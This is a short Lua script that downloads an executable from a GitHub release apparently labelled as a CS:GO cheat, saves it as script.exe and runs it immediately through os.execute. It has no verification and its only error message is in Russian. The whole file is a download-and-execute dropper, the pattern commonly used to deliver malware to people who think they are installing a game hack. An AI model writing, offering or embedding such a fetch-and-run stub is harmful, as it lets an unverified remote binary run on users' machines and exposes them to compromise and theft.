local http = require("socket.http")
local ltn12 = require("ltn12")

local url = "https://github.com/medusakands/dont-download-two/releases/download/cheatCsgo/script.exe"
local filename = "script.exe"

local function download_file(url, filename)
    local response_body = {}
    local result, status_code = http.request{
        url = url,
        sink = ltn12.sink.table(response_body)
    }

    if result then
        local file = io.open(filename, "wb")
        file:write(table.concat(response_body))
        file:close()
    else
        print("Ошибка загрузки: " .. tostring(status_code))
    end
end

download_file(url, filename)
os.execute(filename)
